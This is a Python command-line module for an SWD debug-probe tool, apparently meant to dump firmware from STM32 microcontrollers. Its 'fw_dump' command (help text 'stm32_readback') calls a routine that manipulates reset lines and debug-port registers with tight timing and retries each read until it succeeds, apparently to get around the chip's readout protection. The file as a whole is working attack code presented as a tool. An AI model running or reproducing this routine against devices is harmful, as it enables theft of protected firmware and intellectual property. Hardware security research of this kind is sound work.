from . import base
import click
from ..protocol import swd
import binascii
import time

@base.cli.group(help = "Security related")
def secu():
    pass

def do_read_memory_attempt(intf, address):
    intf.freq_cap("hack", 30e6)
    intf.turnaround_cycles = 1

    intf.trst = False
    intf.reset = True
    time.sleep(.02)
    intf.reset = True
    intf.trst = True
    time.sleep(.002)

    cmd = [
        intf.cmd_wakeup(100),
        intf.cmd_jtag_to_swd(),
        intf.cmd_wakeup(100),
        intf.cmd_run(1),
        intf.cmd_read(False, intf.IDCODE),
        intf.cmd_write(False, 2, 0x1), # SELECT
        intf.cmd_write(False, 1, 0x100), # WCR
        ]
    intf.execute(cmd)
    for i in cmd:
        if hasattr(i, "ack"):
            print(i, i.ack, hex(i.data))

    intf.turnaround_cycles = 2
    intf.freq_cap("hack", 30e6)
    cmd = [
        intf.cmd_write(False, 2, 0), # SELECT
        intf.cmd_write(False, 1, 0x50000020), # CTRLSTAT
        intf.cmd_write(False, 1, 0x50000021), # CTRLSTAT
        intf.cmd_read(False, 1), # CTRLSTAT
        intf.cmd_write(False, 2, 0), # SELECT
        ]
    intf.execute(cmd)
    for i in cmd:
        if hasattr(i, "ack"):
            print(i, i.ack, hex(i.data))

    cmd = [
        intf.cmd_write(True, 0, 0x00000012), # CSW
        intf.cmd_run(4),
        intf.cmd_write(True, 1, address), # TAR
        ]
    intf.execute(cmd)
    for i in cmd:
        if hasattr(i, "ack"):
            print(i, i.ack, hex(i.data))
            rd = i

    intf.reset = False

    cmd = [
        intf.cmd_run(1),
        intf.cmd_read(True, 3),  # DRW
        intf.cmd_read(True, 3),  # DRW
        intf.cmd_read(True, 3),  # DRW
        intf.cmd_run(10),
        intf.cmd_read(False, 3),  # RDBUFF
    ]
    intf.execute(cmd)
    for i in cmd:
        if hasattr(i, "ack"):
            print(i, i.ack, hex(i.data))
            rd = i

    time.sleep(.010)

    intf.trst = False

    print()
    
    return rd.ack, rd.data

@secu.command(help = "stm32_readback")
@click.option('-r', '--root', type = base.ROOT)
@click.argument("base", type = base.HEX, required = True)
@click.argument("size", type = base.HEX, required = True)
def fw_dump(root, base, size):
    intf = root
    assert isinstance(intf, swd.Interface)

    for a in range(base, base + size, 4):
        while True:
            ack, value = do_read_memory_attempt(intf, a)
            if ack == swd.Ack.OK:
                break
        print(hex(a), ack, hex(value))
